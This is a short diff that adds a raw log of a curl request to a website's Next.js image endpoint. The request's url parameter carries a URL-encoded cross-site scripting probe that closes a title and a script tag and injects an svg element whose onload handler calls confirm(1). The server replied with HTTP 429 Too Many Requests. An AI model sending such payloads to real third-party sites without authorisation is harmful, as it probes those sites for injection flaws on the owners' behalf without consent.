@@ -1,0 +1,10 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' 'https://www.infinitycapital.bh/_next/image?url=s5xe5d539f7%22%27%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Csvg+onload%3Dconfirm%281%29%3E'
+# exit_code: 0
+# ---
+
+Too Many Requests
+
+Too Many Requests
+bom1::zdfcc-1790717800369-6c5ccbbdb9ab
+HTTP_STATUS:429
+CTYPE:text/plain; charset=utf-8
